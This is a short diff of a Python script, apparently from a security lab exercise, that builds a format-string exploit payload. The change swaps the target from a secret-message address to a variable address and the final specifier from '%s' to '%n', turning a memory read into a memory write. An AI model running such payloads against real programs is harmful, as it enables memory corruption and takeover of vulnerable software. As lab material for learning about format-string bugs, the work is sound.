@@ -8,12 +8,11 @@ N = 1500
 content = bytearray(0x0 for _ in range(N))
 
 # Address of the secret message
-# secret_msg_addr = 0x080af014
-secret_msg_addr = 0x080b9008
-content[0:4]  =  (secret_msg_addr).to_bytes(4,byteorder='little')
+target_variable_addr = 0x080ee068
+content[0:4]  =  (target_variable_addr).to_bytes(4,byteorder='little')
 
 # This line shows how to construct a string s with
-s = "%.8x."* 63 + "%s"
+s = "%.8x."* 63 + "%n"
 
 # The line shows how to store the string s at offset 4
 fmt  = (s).encode('latin-1')
